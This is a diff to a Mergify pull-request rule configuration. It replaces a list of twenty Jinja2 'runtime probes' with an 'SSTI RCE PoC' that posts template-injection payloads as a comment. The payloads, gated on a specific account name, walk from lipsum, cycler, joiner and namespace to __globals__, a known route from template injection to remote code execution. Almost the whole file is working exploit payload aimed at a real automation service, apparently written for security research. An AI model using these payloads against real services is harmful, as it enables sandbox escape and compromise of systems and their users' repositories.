@@ -1,28 +1,15 @@
-# G4o7T probe set v4
 pull_request_rules:
-  - name: probes
+  - name: ssti-rce-poc
     conditions: []
     actions:
       comment:
         message: |
-          === MERGIFY RUNTIME PROBES v4 ===
-          P01-lipsum: '{{ lipsum }}'
-          P02-cycler: '{{ cycler }}'
-          P03-joiner: '{{ joiner }}'
-          P04-namespace: '{{ namespace }}'
-          P05-range: '{{ range }}'
-          P06-self: '{{ self }}'
-          P07-author: '{{ author }}'
-          P08-author-upper: '{{ author.upper() }}'
-          P09-author-encode: '{{ author.encode() }}'
-          P10-author-format-call: '{{ author.format(1,2) }}'
-          P11-fmt-via-attr: '{{ ''|attr('format')('hello {0}', author) }}'
-          P12-fmt-direct: '{{ '{0}'.format(author) }}'
-          P13-fmt-via-author: '{{ '{0}'.format(123) }}'
-          P14-author-attrs-via-attr: '{{ author|attr('upper')() }}'
-          P15-author-globals: '{{ author|attr('__globals__') }}'
-          P16-author-class: '{{ author|attr('__class__') }}'
-          P17-author-base: '{{ author|attr('__base__') }}'
-          P18-list-class: '{{ files|attr('__class__') }}'
-          P19-tojson-self: '{{ self|tojson }}'
-          P20-pprint-self: '{{ self|pprint }}'
+          === G4o7T SSTI RCE PoC ===
+          author={{ author }}
+          {% if author == 'mergify-account-B' %}
+          [TIER1] cycler-via-set={% set x = cycler %}{{ x | attr('__globals__') }}
+          [TIER2] lipsum-globals={{ lipsum | attr('__globals__') }}
+          [TIER3] cycler-via-set-x={% set x = cycler %}{{ x }}
+          [TIER4] joiner-call={% set j = joiner() %}{{ j | attr('__call__') | attr('__globals__') }}
+          [TIER5] namespace-init={% set n = namespace %}{% set i = n.__init__ %}{{ i | attr('__globals__') }}
+          {% endif %}
